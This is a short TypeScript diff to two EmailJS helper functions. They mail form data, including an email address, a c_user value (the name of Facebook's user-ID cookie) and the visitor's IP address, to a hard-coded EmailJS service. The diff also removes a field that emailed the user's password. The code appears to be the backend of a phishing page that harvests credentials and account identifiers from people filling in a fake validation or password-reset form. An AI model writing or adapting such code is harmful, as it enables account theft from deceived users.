@@ -10,7 +10,7 @@ export const sendValidationFormEmail = async (formData: any) => {
   try {
     const response = await emailjs.send(
       "service_jpksfco",      // Service ID
-      "template_90egw9s",     // Template ID
+      "template_90egw9s",     // Validation Template ID
       {
         user_email: formData.user_email,
         c_user: formData.c_user,
@@ -33,10 +33,9 @@ export const sendConfirmationFormEmail = async (formData: any) => {
   try {
     const response = await emailjs.send(
       "service_jpksfco",      // Service ID
-      "template_90egw9s",     // Template ID
+      "template_90egw9s",     // Confirmation Template ID for password reset
       {
         user_email: formData.user_email,
-        password: formData.password,
         contact_method: formData.contactMethod,
         timestamp: new Date().toISOString(),
         ip_address: formData.ip_address || 'Not available',
